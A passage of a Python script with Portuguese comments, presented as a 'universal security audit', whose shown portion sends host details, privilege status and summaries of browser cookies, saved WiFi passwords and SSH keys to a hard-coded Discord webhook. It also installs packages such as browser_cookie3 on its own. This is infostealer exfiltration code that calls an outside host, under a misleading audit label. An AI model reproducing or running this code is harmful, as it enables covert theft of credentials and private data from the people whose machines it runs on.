                "content": f"🚨 **RELATÓRIO DE SEGURANÇA**\n**Sistema:** {self.data['system_info']['os']} {self.data['system_info']['release']}\n**Privilégios:** {privilege_status}\n**Session ID:** `{self.session_id}`"
            }
            
            response = requests.post(self.webhook_url, json=payload, timeout=30)
            if response.status_code in [200, 204]:
                print("✅ Relatório principal enviado com sucesso!")
                
                # Envia dados adicionais
                self.send_additional_data()
                return True
            else:
                print(f"❌ Erro ao enviar: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Erro de conexão: {e}")
            return False
    
    def send_additional_data(self):
        """Envia dados adicionais em webhooks separados"""
        try:
            # Webhook 2: Dados de hardware e rede
            hardware_embed = {
                "title": "💾 DETALHES DE HARDWARE E REDE",
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "🖥️ CPU",
                        "value": f"**Núcleos:** {self.data['hardware']['cpu_cores']} ({self.data['hardware']['cpu_physical_cores']} físicos)\n**Uso:** {self.data['hardware']['cpu_usage']}%\n**Frequência:** {self.data['hardware']['cpu_frequency'].get('current', 'N/A')} MHz",
                        "inline": True
                    },
                    {
                        "name": "💾 MEMÓRIA",
                        "value": f"**Total:** {self.data['hardware']['memory_total']}\n**Usada:** {self.data['hardware']['memory_used']} ({self.data['hardware']['memory_percent']}%)\n**Livre:** {self.data['hardware']['memory_available']}",
                        "inline": True
                    },
                    {
                        "name": "🌐 REDE",
                        "value": f"**Enviado:** {self.data['network_stats'].get('bytes_sent', 'N/A')}\n**Recebido:** {self.data['network_stats'].get('bytes_recv', 'N/A')}\n**Interfaces:** {len(self.data['network_interfaces'])}",
                        "inline": True
                    }
                ]
            }
            
            payload2 = {
                "embeds": [hardware_embed],
                "username": "Hardware & Network Info"
            }
            
            requests.post(self.webhook_url, json=payload2, timeout=30)
            print("✅ Dados de hardware enviados!")
            
            # Webhook 3: Dados sensíveis (se disponíveis)
            if 'sensitive' in self.data and any(self.data['sensitive'].values()):
                sensitive_embed = {
                    "title": "🔐 DADOS SENSÍVEIS (RESUMO)",
                    "color": 0xffa500,
                    "fields": []
                }
                
                sensitive = self.data['sensitive']
                
                # Adiciona status de privilégios
                sensitive_embed['fields'].append({
                    "name": "🔐 PRIVILÉGIOS",
                    "value": f"**Root/Admin:** {'✅ SIM' if self.has_root else '❌ NÃO'}\n**Acesso Completo:** {'✅ SIM' if self.has_root else '❌ DADOS LIMITADOS'}",
                    "inline": False
                })
                
                if 'browser_data' in sensitive and sensitive['browser_data']:
                    browsers = []
                    for browser, data in sensitive['browser_data'].items():
                        if 'cookies_count' in data:
                            browsers.append(f"{browser}: {data['cookies_count']} cookies")
                    
                    if browsers:
                        sensitive_embed['fields'].append({
                            "name": "🌐 NAVEGADORES",
                            "value": "\n".join(browsers),
                            "inline": True
                        })
                
                if 'wifi_passwords' in sensitive:
                    if isinstance(sensitive['wifi_passwords'], list) and sensitive['wifi_passwords']:
                        sensitive_embed['fields'].append({
                            "name": "📶 REDES WiFi",
                            "value": f"**Senhas salvas:** {len(sensitive['wifi_passwords'])} redes",
                            "inline": True
                        })
                    elif 'info' in sensitive['wifi_passwords']:
                        sensitive_embed['fields'].append({
                            "name": "📶 REDES WiFi",
                            "value": f"**Status:** {sensitive['wifi_passwords']['info']}",
                            "inline": True
                        })
                
                if 'ssh_keys' in sensitive and sensitive['ssh_keys']:
                    sensitive_embed['fields'].append({
                        "name": "🔑 CHAVES SSH",
                        "value": f"**Encontradas:** {len(sensitive['ssh_keys'])} chaves",
                        "inline": True
                    })
                
                if sensitive_embed['fields']:
                    payload3 = {
                        "embeds": [sensitive_embed],
                        "username": "Sensitive Data Summary"
                    }
                    requests.post(self.webhook_url, json=payload3, timeout=30)
                    print("✅ Resumo de dados sensíveis enviado!")
                    
        except Exception as e:
            print(f"⚠️ Erro ao enviar dados adicionais: {e}")

# Instalação de dependências automática
def install_dependencies():
    """Instala dependências automaticamente"""
    required_packages = [
        'requests',
        'psutil',
        'cryptography'
    ]
    
    optional_packages = [
        'browser_cookie3',
        'geocoder'
    ]
    
    print("🔧 Verificando dependências...")
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"✅ {package} já instalado")
        except ImportError:
            print(f"📦 Instalando {package}...")
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} instalado com sucesso")
            except:
                print(f"❌ Falha ao instalar {package}")

# COMO USAR
if __name__ == "__main__":
    print("🚀 Iniciando auditoria universal de segurança...")
    
    # Instala dependências se necessário
    try:
        install_dependencies()
    except:
        print("⚠️ Não foi possível instalar dependências automaticamente")
    
    # Webhook do Discord
    WEBHOOK_URL = "https://discord.com/api/webhooks/1424954664687894580/JcxKPVL-DfcXfAE4gMpua1MwuBpcQSF75Pwp8PZEQA3mNUzzRyrIDLc7MbJjUS0FaLmD"
    
    if WEBHOOK_URL == "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI":
        print("❌ Por favor, configure o WEBHOOK_URL no código")
        sys.exit(1)
    
    try:
        monitor = UniversalSecurityMonitor(WEBHOOK_URL)
        success = monitor.send_comprehensive_report()
        
        if success:
            print("🎉 Auditoria concluída e relatório enviado!")
            print(f"📋 Session ID: {monitor.session_id}")
            print(f"🔐 Privilégios: {'ROOT/ADMIN' if monitor.has_root else 'USUÁRIO NORMAL'}")
            print(f"📊 Modo: {'COMPLETO' if monitor.has_root else 'LIMITADO'}")
        else:
            print("❌ Falha no envio do relatório.")
            
    except Exception as e:
        print(f"💥 Erro crítico: {e}")
        import traceback
        traceback.print_exc()
    
    # Mantém o terminal aberto (apenas Windows)
    if platform.system() == "Windows":
        input("Pressione Enter para sair...")
